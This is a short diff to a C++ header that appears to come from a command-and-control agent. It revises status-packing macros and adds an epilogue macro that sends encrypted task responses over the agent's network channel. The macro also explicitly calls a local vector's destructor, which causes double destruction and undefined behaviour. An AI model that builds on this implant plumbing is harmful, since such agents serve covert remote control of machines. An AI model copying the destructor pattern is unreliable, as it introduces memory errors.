@@ -12,8 +12,14 @@ typedef struct {
 
 NTSTATUS handle_cmd(PMODULE_CONTEXT ctx);
 
-#define PACK_GLE_STATUS	  builder.add_byte(bResult); \
-						  builder.add_int(GetLastError());
+#define PACK_GLE_STATUS	  builder->add_byte(bResult); \
+						  builder->add_int(GetLastError());
 
-#define PACK_NTSTATUS_STATUS	  builder.add_byte(bResult); \
-						  builder.add_int(status);
+#define PACK_NTSTATUS_STATUS	  builder->add_byte(bResult); \
+						  builder->add_int(status);
+
+
+#define STANDART_EPILOGUE builder->padding(16); \
+						  auto out_data = builder->build(); \
+						  ctx->netio.send_encrypted_taskresponse(ctx, (char*)out_data.data(), out_data.size()); \
+						  out_data.~vector();
